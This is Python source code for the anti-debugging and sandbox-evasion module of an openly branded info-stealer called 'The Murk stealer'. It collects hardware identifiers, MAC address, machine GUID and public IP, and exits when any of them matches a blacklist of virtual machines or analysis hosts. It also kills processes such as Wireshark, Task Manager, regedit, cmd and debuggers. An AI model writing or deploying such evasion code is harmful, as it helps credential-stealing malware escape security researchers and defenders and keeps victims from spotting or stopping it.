#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
from subprocess import check_output, PIPE
import psutil
import uuid
import wmi
import subprocess
import requests
import platform
import json
from data import BlackList




kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]


def checkHWID():
    try:
        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        return "No data"


def checkMAC():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
    except:
        return "No data"
    


def checkBIOS():
    try:
        c = wmi.WMI()
        bios = c.Win32_BIOS()[0]
        return bios.SerialNumber.strip()
    except:
        return "No data"


def checkManufacture():
    try:
        c = wmi.WMI()
        baseboard = c.Win32_BaseBoard()[0]
        return baseboard.Manufacturer.strip()
    except:
        return "No data"


def checkBASE():
    try:
        wmi_service = wmi.WMI()
        baseboards = wmi_service.Win32_BaseBoard()
        return  baseboards[0].SerialNumber
    except:
        return "No data"
    


def checkCPU():
    try:
        cpu_info = psutil.cpuinfo()
        return cpu_info[0].serial
    except:
        return "No data"



def checkDrive():
    try:
        c = wmi.WMI()
        drives = c.Win32_DiskDrive()
        return drives[0].SerialNumber.strip()
    except:
        return "No data"


def checkHW_profile():
    try:
        c = wmi.WMI()
        hw_profiles = c.Win32_SystemDriver()
        for profile in hw_profiles:
            if profile.DisplayName == 'HW Profile GUID':
                return profile.Description.strip()
        return "No data"
    except:
        return "No data"


def checkGUID():
    try:
        output = subprocess.check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=subprocess.DEVNULL)
        lines = output.decode().split('\n')
        for line in lines:
            if 'MachineGuid' in line:
                _, guid = line.split()
            return guid.strip()
        return "No data"
    except:
        return "No data"



def checkGPU():
    try:
        c = wmi.WMI()
        gpu_info = []
        for gpu in c.Win32_VideoController():
            gpu_info.append((gpu.Name))
        return gpu_info
    except:
        return []




def checkIP():
    try:
        return json.loads(requests.get('https://ipinfo.io/json').text)['ip']
    except:
        return "No data"


def checkPlatform():
    try:
        return platform.system()
    except:
        return "No data"









def AntiDebug(oneStart):  

    print("ad")
    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'

    if oneStart:
        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
            os._exit(0)
    if os.path.exists(rf'{pathf}\windll'):
        os._exit(0)

    processlist = psutil.process_iter(['name'])

    if os.getenv("USERPROFILE") in BlackList.Users:
        os._exit(0)


    if os.getenv('COMPUTERNAME') in BlackList.PC_Name:
        os._exit(0)


    if checkHWID() in BlackList.HWID:
        os._exit(0)


    if checkMAC() in BlackList.Mac_Address:
        os._exit(0)


    for exe in processlist:
        if exe.info.get('name') in BlackList.Processes:
            os._exit(0)

    if checkBIOS() in BlackList.Bios:
        os._exit(0)

    
    if checkManufacture() in BlackList.Manufacture:
        os._exit(0)


    if checkBASE() in BlackList.aseBoard:
        os._exit(0)


    if checkCPU() in BlackList.CPU:
        os._exit(0)


    if checkDrive() in BlackList.Drive:
        os._exit(0)


    if checkHW_profile() in BlackList.HW_Profile_GUID:
        os._exit(0)
 


    if checkGUID() in BlackList.Machine_GUID:
        os._exit(0)

    gpus = checkGPU()
    for gpu in gpus:
        if gpu in BlackList.GPU:
            os._exit(0)

    if checkIP() in BlackList.ip:
        os._exit(0)

    if checkPlatform() in BlackList.Platform:
        os._exit(0)
    
    for proc in processlist:
            if any(procstr in proc.name().lower() for procstr in kill_Processes):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
